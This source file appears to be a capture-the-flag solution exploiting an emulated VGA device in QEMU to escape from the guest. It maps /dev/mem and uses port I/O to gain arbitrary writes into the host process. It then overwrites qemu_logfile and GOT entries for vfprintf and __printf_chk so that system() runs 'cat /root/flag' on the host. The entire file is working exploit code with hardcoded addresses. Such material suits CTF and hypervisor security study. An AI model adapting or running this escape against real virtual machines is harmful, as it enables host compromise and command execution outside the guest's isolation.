#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

int mmio_fd;
size_t mmio_addr = 0xfebc1000, vga_addr = 0xa0000;
int mmio_size = 0x1000, vga_size = 0x20000;
void *mmio_mem, *vga_mem;
int PIO_BASE = 0x3b0;
int cnt = 0;

int init_mmio() {

    mmio_mem = mmap(0, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, mmio_addr);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%lx\n", (size_t) mmio_mem);

    return 0;
}

int init_vga_mem() {

    vga_mem = mmap(0, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, vga_addr);
    if (vga_mem < 0) {
        perror("mmap vga_mem");
        return -1;
    }
    printf("vga_mem: 0x%lx\n", (size_t) vga_mem);

    return 0;
}

uint8_t mmio_read(uint64_t addr) {
    return *(uint8_t *)((uint8_t *) mmio_mem + addr);
}

void mmio_write(uint64_t addr, uint8_t val) {
    *(uint8_t *)((uint8_t *) mmio_mem + addr) = val;
}

uint8_t vga_read(uint64_t addr) {
    return *(uint8_t *)((uint8_t *) vga_mem + addr);
}

void vga_write(uint64_t addr, uint8_t val) {
    *(uint8_t *)((uint8_t *) vga_mem + addr) = val;
}

/* PIO */
void set_cmd(uint32_t val) {
    outb(0xcc, PIO_BASE + 0x14); /* idx */
    outb(val, PIO_BASE + 0x15); /* val */
}

void set_idx(uint32_t val) {
    outb(0xcd, PIO_BASE + 0x14); /* idx */
    outb(val, PIO_BASE + 0x15); /* val */
}

void set_flag(uint32_t val) {
    outb(0x7, PIO_BASE + 0x14); /* idx */
    outb(val, PIO_BASE + 0x15); /* val */
}

/* MMIO */
void init_latch() {
    uint8_t r;

    r = vga_read(0xcafe); /* init latch */
    printf("r = 0x%x\n", r); /* must use the var, or the compiler will optimize the operation */
}

void set_latch(uint32_t val) {
    uint8_t r;

    printf("set latch to 0x%x\n", val);
    r = vga_read((val >> 16) & 0xffff); /* evaluate with high 16 bits */
    printf("r = 0x%x\n", r);
    r = vga_read(val & 0xffff); /* or with low 16 bits */
    printf("r = 0x%x\n", r);
}

void arb_write(uint64_t &addr, uint64_t &val, int sz) {
    char *data = (char *) &val;

    set_latch(addr - cnt);
    for (int i = 0; i < sz; i++) {
        vga_write(0x18100, data[i]);
        printf("0x%x\n", (uint8_t) data[i]);
    }
    cnt += sz;
}

void get_shell() {
    set_cmd(2);
    vga_write(0x18100, 1); /* call __printf_chk */
}

int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    system("mknod -m 660 /dev/mem c 1 1"); /* mmap /dev/mem <= `man mem` */

    mmio_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (!mmio_fd) {
        perror("open /dev/mem");
        exit(-1);
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    r = init_vga_mem();
    if (r == -1) {
        perror("init vga mem");
        exit(-1);
    }

    /* init PIO */
    r = ioperm(PIO_BASE, 0x30, 1);
    if (r < 0) {
        perror("ioperm");
        exit(-1);
    }

    /* init env */
    set_flag(1); /* bypass condition */
    set_cmd(4); /* cmd */
    set_idx(0x10); /* idx points to latch */
    init_latch(); /* start from high 16 bits */

    /* overwrite ptrs */
    char cmd[] = "cat /root/flag";
    uint64_t bss_buf = 0xee8310;
    printf("bss_buf: 0x%lx\n", (uint64_t) bss_buf);
    arb_write(bss_buf, (uint64_t &) cmd, strlen(cmd) + 1);

    uint64_t qemu_logfile = 0x00000000010CCBE0;
    printf("qemu_logfile: 0x%lx\n", (uint64_t) qemu_logfile);
    arb_write(qemu_logfile, bss_buf, 8);

    uint64_t system_plt = 0x409dd0;
    uint64_t vfprintf_got = 0xee7bb0;
    printf("system_plt: 0x%lx\n", (uint64_t) system_plt);
    printf("vfprintf_got: 0x%lx\n", (uint64_t) vfprintf_got);
    arb_write(vfprintf_got, system_plt, 8);

    uint64_t qemu_log_addr = 0x00000000009726E8;
    uint64_t printf_chk_got = 0xee7028;
    printf("qemu_log_addr: 0x%lx\n", (uint64_t) qemu_log_addr);
    printf("printf_chk_got: 0x%lx\n", (uint64_t) printf_chk_got);
    arb_write(printf_chk_got, qemu_log_addr, 8);

    /* get shell */
    get_shell();

    close(mmio_fd);

    exit(0);
}
